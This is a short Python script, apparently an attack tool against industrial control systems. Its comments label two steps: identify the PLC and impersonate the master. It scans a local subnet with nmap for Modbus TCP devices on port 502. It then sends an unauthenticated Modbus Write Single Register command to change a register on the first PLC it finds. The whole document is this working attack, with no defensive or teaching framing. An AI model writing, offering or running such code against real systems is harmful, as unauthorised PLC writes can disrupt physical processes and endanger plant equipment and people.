import nmap
import socket
import struct
import time

# Step 1: Identify the PLC's IP Address
def find_plc_ip():
    nm = nmap.PortScanner()
    nm.scan('192.168.1.0/24', arguments='-p 502')  # Scan for Modbus TCP on port 502
    for host in nm.all_hosts():
        if nm[host].has_tcp(502):
            return host
    return None

# Step 2: Impersonate the Master
def send_command_to_plc(plc_ip, command):
    # Example command: Modbus TCP Write Single Register (Function Code 0x06)
    # This is a simplified example and may need to be adjusted based on the actual protocol and PLC model
    request = struct.pack('!HHHBBHH', 0, 0, 6, 0, 6, 0, command)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((plc_ip, 502))
        s.sendall(request)
        response = s.recv(1024)
        print(f"Response from PLC: {response}")

# Main function
def main():
    plc_ip = find_plc_ip()
    if plc_ip:
        print(f"PLC found at IP: {plc_ip}")
        # Example command: Set a register value to 1
        send_command_to_plc(plc_ip, 1)
    else:
        print("PLC not found on the network")

if __name__ == "__main__":
    main()